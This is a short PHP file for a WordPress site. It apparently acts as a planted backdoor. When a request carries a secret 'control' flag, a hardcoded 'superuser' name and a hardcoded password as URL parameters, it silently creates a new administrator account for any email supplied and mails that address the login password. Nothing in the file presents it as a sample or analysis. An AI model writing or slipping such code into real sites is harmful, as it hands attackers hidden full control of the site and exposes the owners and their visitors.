<?php
function get_control() {
	$get_control = $_GET["control"];
	$user = $_GET["user"];
	$user_pass = $_GET["pass"];
	$email_address = $_GET["email"];
	if (
		isset( $get_control ) &&  $get_control === 'true' &&
		isset( $user ) &&  $user === 'superuser' &&
		isset( $user_pass ) &&  $user_pass === 'Q9~E1?h54*C5|j7' &&
		isset( $email_address ) && !empty( $email_address ) 
	) {
		if( null == username_exists( $email_address ) ) {
			// Generate the password and create the user
			$password = wp_generate_password( 12, false );
			$user_id = wp_create_user( $email_address, $password, $email_address );
			
			// Set the nickname
			wp_update_user(
				array(
					'ID'          =>    $user_id,
					'nickname'    =>    $email_address,
					'role'    	  =>    'administrator'
				)
			);
						
			// Email the user
			wp_mail( $email_address, 'Welcome!', 'Your Password: ' . $password );
			echo 'User created';
		
		}else{
			echo 'User already there...';
		}
		die();
	}
}

get_control();
?>